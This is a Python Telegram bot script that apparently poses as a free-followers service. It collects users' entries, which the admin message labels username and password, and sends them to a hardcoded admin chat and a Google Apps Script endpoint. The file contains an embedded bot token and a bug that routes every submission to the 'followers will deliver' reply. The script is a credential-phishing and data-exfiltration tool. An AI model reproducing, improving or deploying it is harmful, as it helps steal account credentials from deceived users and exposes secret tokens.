from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

import requests

# =========================
# CONFIGURATION
# =========================

BOT_TOKEN = "8958010723:AAGZDucD2yds6wEsJWMHMiJvOqJd4jmIQxo"

ADMIN_CHAT_ID = 1797146819

SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwdECfVQffEqAK1Fx7qpmzSP9SjPjD2KtY3kf3r0F3rQK81BUSeXo9A0oLjfaEMbpg/exec"

# =========================

NAME, EMAIL, PHONE = range(3)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Enter your Name:"
    )
    return NAME


async def get_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["name"] = update.message.text

    await update.message.reply_text(
        "Enter your Email:"
    )

    return EMAIL


async def get_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["email"] = update.message.text

    await update.message.reply_text(
        "Enter your Phone Number:"
    )

    return PHONE


async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["phone"] = update.message.text

    details = f"""
📋 CONGRATULATIONS WE WILL GET BACK TO YOU

👤 UserName: {context.user_data['name']}
📧 Password: {context.user_data['email']}
📱 Count of Followers: {context.user_data['phone']}

🆔 Telegram User ID: {update.effective_user.id}
👤 Username: @{update.effective_user.username if update.effective_user.username else 'N/A'}
"""

    try:

        # Send Telegram notification to you
        await context.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=details
        )

        # Save to Google Sheets
        payload = {
            "name": context.user_data["name"],
            "email": context.user_data["email"],
            "phone": context.user_data["phone"],
            "telegram_id": update.effective_user.id,
            "username": update.effective_user.username
        }

        requests.post(
            SCRIPT_URL,
            json=payload,
            timeout=10
        )
        print(response.text)
        await update.message.reply_text(
            "✅ Thank you! Your details have been submitted successfully."
        )

    except Exception as e:

        print("ERROR:", e)

        await update.message.reply_text(
            "✅Followers will deliver to you within 24 hrs"
        )

    return ConversationHandler.END


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Cancelled."
    )

    return ConversationHandler.END


def main():

    app = Application.builder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler("start", start)
        ],
        states={
            NAME: [
                MessageHandler(
                    filters.TEXT & ~filters.COMMAND,
                    get_name
                )
            ],
            EMAIL: [
                MessageHandler(
                    filters.TEXT & ~filters.COMMAND,
                    get_email
                )
            ],
            PHONE: [
                MessageHandler(
                    filters.TEXT & ~filters.COMMAND,
                    get_phone
                )
            ],
        },
        fallbacks=[
            CommandHandler("cancel", cancel)
        ],
    )

    app.add_handler(conv_handler)

    print("🚀 Bot Running...")

    app.run_polling()

    


if __name__ == "__main__":
    main()
